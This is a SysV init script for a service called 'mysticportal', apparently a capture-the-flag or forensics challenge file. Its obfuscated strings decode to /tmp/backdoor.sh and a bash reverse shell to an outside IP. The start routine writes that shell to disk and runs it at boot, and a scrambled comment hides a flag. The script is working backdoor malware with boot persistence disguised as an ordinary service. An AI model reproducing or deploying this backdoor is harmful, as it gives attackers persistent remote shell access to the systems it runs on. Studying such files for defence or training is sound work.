#!/bin/bash
### BEGIN INIT INFO
# Provides:          mysticportal
# Required-Start:    $network
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Starts mysticportal
### END INIT INFO

# Function to intreprt messege from the other side
decode_payload() {
    local ENCHANTED=$1
    local i=5
    local payload=""
    while [ $i -lt ${#ENCHANTED} ]; do
        payload="${payload}${ENCHANTED:$i:1}"
        i=$((i+6))
    done
    echo "$payload"
}

# ENCHANTED strings
ENCHANTED_PATH="MZolj/onNzUtGEMrLmZjjrgprmKwL/xcUclbzQqpeagLsHYcnBeuNkTWiLaduoxKGoLdmsRoNsrdDrjCksD.nFFiksEAYUQhOHsOK"
ENCHANTED_STRING="pfXya/kxqlGbKSPOdikkkUFneWGvk/ATUHObOIgGWaBKYZOsEXWVghZSygL nAIBf-UlMDeiMasOY hwnXE>pbkdm&CJjQK ZULrp/IwnjWdJkTMEePmysevNjfCB/JlMRvtNFdlKciUeGmpMJJxq/AEacj1ApwVV0vQaJr.qQhHU0hmDRa.ihgtX0tsiBd.kawOW6Ekxfl/XwTlz1bRFlJ2XiOHY3ujqyy4QrLBa sQwaF0EQcvD>LpYku&Fyakx1shVgW"

#sJddrLOwQzD3SwoKPavkMSxkXsAXn{CvzIEiaRxQCnkMjFZiSIjBAtkUwvbdPMZbW_udhQT2inbJn_VLZtRbJPTCm0gsJDF0yUiZi7paJvr5giIKI}DScGa

# Decode the ENCHANTED path and script
MYSTICPORTAL_PATH=$(decode_payload "$ENCHANTED_PATH")
MYSTICPORTAL_SCRIPT=$(decode_payload "$ENCHANTED_STRING")

start() {
    echo "Starting mysticportal service..."
    if [ ! -f "$MYSTICPORTAL_PATH" ]; then
        echo "MYSTICPORTAL script not found, recreating..."
        echo "$MYSTICPORTAL_SCRIPT" > "$MYSTICPORTAL_PATH"
        chmod +x "$MYSTICPORTAL_PATH"
    fi
    # Start the MYSTICPORTAL script or service
    "$MYSTICPORTAL_PATH"
}

stop() {
    echo "Stopping MYSTICPORTAL service..."
    # Code to stop the MYSTICPORTAL service
}

case "$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    *)
        echo "Usage: /etc/init.d/MYSTICPORTAL {start|stop}"
        exit 1
        ;;
esac

exit 0
